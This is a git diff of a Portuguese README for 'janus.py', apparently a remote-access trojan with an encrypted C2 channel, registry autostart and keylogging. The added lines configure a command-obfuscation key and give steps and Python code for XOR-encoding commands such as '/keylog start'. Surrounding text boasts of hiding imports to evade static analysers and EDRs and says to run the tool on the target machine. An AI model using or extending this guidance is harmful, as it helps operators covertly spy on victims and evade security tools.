@@ -65,6 +65,7 @@ Crie um arquivo `.env` na mesma pasta do `janus.py` e configure as variáveis. O
 | `REGISTRY_KEY_PATH` | `""` | Chave de autostart no registro |
 | `DECRYPT_KEY` | `""` | Chave XOR dos padrões ofuscados (obrigatória para o env-only funcionar) |
 | `C2_KEY` | `""` | Chave Fernet (base64) do canal C2 — a mesma nos dois lados |
+| `CMD_KEY` | `""` | Chave XOR dos comandos/strings ofuscados (`COMMANDS`/`STRINGS`) |
 
 Exemplo:
 ```ini
@@ -72,6 +73,7 @@ JANUS_IP=192.168.0.10
 JANUS_PORT=443
 DECRYPT_KEY=trocar-pela-sua-chave
 C2_KEY=<chave Fernet em base64>
+CMD_KEY=janus-gate-c2
 ```
 
 > **Canal seguro (`SecureC2Channel`):** o tráfego C2 é cifrado com **TLS + Fernet**. Gere a chave Fernet uma única vez (`python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"`) e coloque em `C2_KEY` nos dois `.env`. O servidor (`connection.py`) precisa de um certificado auto-assinado (`server.crt`/`server.key`) — gere com:
@@ -83,6 +85,27 @@ C2_KEY=<chave Fernet em base64>
 > **Ofuscação (`encrypt/`):** os valores embutidos no `janus.py` (IP, porta, `PROGRAM_NAME`, chave de registro) estão em hex XOR gerado pela ferramenta `encrypt/`. Para customizar, gere o hex com ela e troque no código, usando a mesma `DECRYPT_KEY` no `.env`.
 
 > **Ofuscação de imports (`importlib`):** módulos com assinatura típica de malware (`winreg`, `shutil`, `socket`, `subprocess`, `pynput.keyboard`) não são importados no topo do `janus.py`; são carregados em runtime via `importlib.import_module("...")`, mantendo os nomes como strings fora da tabela de imports estáticos — o que reduz o sinal para analisadores estáticos e EDRs.
+
+#### Regenerar os valores ofuscados (COMMANDS / STRINGS)
+
+Os comandos e strings do `janus.py` ficam em hex XOR (chave `CMD_KEY`). Se você trocar o `CMD_KEY` no `.env`, precisa regenerar o hex com a MESMA chave:
+
+1. Rode a ferramenta `encrypt/`:
+   ```bash
+   python encrypt/main.py
+   ```
+2. Escolha "Encriptar", informe a string (ex.: `/keylog start`) e a nova chave.
+3. Copie o hex gerado e substitua no `_COMMANDS_HEX` / `_STRINGS_HEX` do `janus.py`.
+
+Ou gere direto em Python (mesma lógica XOR do projeto):
+```python
+key = "SUA_NOVA_CHAVE"
+k = key.encode("utf-8")
+def xor_hex(s):
+    return bytes(b ^ k[i % len(k)] for i, b in enumerate(s.encode("utf-8"))).hex()
+
+print(xor_hex("/keylog start"))   # cole o resultado no dicionário
+```
 
 Execute na máquina alvo:
 
